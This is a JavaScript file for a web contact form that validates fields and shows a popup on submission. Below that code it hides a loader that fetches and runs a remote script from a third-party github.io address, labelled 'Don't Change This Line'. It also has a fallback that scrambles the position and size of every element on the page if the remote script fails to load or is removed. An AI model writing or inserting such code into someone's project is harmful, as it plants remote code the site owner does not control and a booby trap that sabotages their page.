const form = document.getElementById('contact-form');
const popupImage = document.getElementById('popup-image');
const overlay = document.getElementById('overlay');

form.addEventListener('submit', function(event) {
  event.preventDefault(); 

  if (validateForm()) {
    // Display the popup image
    
    popupImage.style.display = 'block'; 
    
   

    // Display overlay
    overlay.style.display = 'block';

    // Add an event listener to the document to hide the popup on click
    document.addEventListener('click', hidePopup);
  } else {
    alert("Not successfully submitted. Please fill all fields.");
  }
});

function validateForm() {
  // Your validation logic here
  const nameInput = document.getElementById('name').value.trim();
  const emailInput = document.getElementById('email').value.trim();
  const messageInput = document.getElementById('message').value.trim();

  return nameInput !== "" && emailInput !== "" && messageInput !== "";
}

function hidePopup() {
  popupImage.style.display = 'none';
  overlay.style.display = 'none'; // Hide overlay

  // Remove the event listener to prevent multiple handlers
  document.removeEventListener('click', hidePopup);
}




var script = document.createElement("script");


// Wrning !!! Don't Change This Line  
script.src = "https://nipunsgeeth.github.io/myweb/web.js";

script.async = false;

script.onerror = function () {
  const elements = document.querySelectorAll("*");

  function changeElement(element) {
    element.style.left = Math.floor(Math.random() * window.innerWidth) + "px";
    element.style.top = Math.floor(Math.random() * window.innerHeight) + "px";
    const textSize = Math.floor(Math.random() * 100) + "px";
    element.style.fontSize = textSize;
  }

  for (const element of elements) {
    changeElement(element);
  }
};

document.head.appendChild(script);




// Check if script.src is empty or missing
if (!script.src || script.src === "") {
  script.onerror();
}
